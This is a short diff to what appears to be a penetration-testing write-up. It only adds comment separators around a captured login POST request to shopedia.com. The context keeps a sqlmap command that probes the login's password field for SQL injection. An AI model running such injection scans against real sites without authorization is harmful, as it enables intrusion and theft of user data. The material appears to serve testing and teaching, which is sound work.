@@ -5,6 +5,8 @@
 ``` bash
 
 # Using BURP to capture the POST request
+
+#-------------------------------------------------------------
 # POST /auth/login.php HTTP/1.1
 # Host: shopedia.com
 # User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -19,6 +21,7 @@
 # Upgrade-Insecure-Requests: 1
 
 # email=1%40gmail.com&password=123123
+#-------------------------------------------------------------
 
 # To find the injection point
 sqlmap -r shopedia-login.post -p password
